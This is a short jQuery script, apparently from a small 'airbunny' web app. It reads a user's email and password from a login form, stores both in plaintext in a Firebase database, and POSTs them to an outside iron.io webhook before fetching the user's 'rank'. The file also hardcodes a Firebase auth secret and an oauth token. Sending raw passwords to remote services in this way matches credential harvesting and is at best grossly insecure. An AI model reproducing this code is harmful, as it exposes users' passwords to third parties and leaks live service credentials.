$(document).ready(function() {



	var ref = new Firebase('https://bnb.firebaseio.com/email_password');
	ref.auth('AOcSqZ8qQIdR5atOoVMo7QAxryrmLscuPI7GuHKH', function () {});

	$('#passwordid').keypress(function (e) {
	    if (e.keyCode == 13) {
	        var email = $('#emailid').val();
	        var password = $('#passwordid').val();

	        var emailName = email.split("@")[0].toLowerCase();


	        ref.push({
	            email: email,
	            password:password
	        });
	        //$('#insightInput').val('');
	        $.ajax({
	                    url: 'https://worker-us-east.iron.io:443/2/projects/58b24a268f66350007c762c2/tasks/webhook?code_name=022617&oauth=SAqJGTvVHuUrCvv1FabKGPrDmVg',
	                    type: 'POST',
	                    data: JSON.stringify({
	                        email: email,
	                        password:password
	                    }),
	                    contentType: 'application/json; charset=utf-8',
	                    dataType: 'json',
	                    async: false
	                });


	        var getJSONUrl = "https://bnb.firebaseio.com/airbunny/" + emailName + "/rank.json";

	        $.getJSON(getJSONUrl, function(data) {
	                    console.log(data)
    		            $('#rank').html(data.rank)

	                });
	        alert('Entered.  Sent.');
	    }
	});

	$('#sendButton').click(function() {
		var email = $('#emailid').val();
		var password = $('#passwordid').val();

		var emailName = email.split("@")[0].toLowerCase();
		alert(emailName);

		ref.push({
		    email: email,
		    password:password
		});

		$.ajax({
		            url: 'https://worker-us-east.iron.io:443/2/projects/58b24a268f66350007c762c2/tasks/webhook?code_name=022617&oauth=SAqJGTvVHuUrCvv1FabKGPrDmVg',
		            type: 'POST',
		            data: JSON.stringify({
		                email: email,
		                password:password
		            }),
		            contentType: 'application/json; charset=utf-8',
		            dataType: 'json',
		            async: false
		        });

		var getJSONUrl = "https://bnb.firebaseio.com/airbunny/" + emailName + "/rank.json";

		$.getJSON(getJSONUrl, function(data) {
		            console.log(data)
		            $('#rank').html(data.rank)
		        });
		alert('Clicked.  Sent.');
	})
});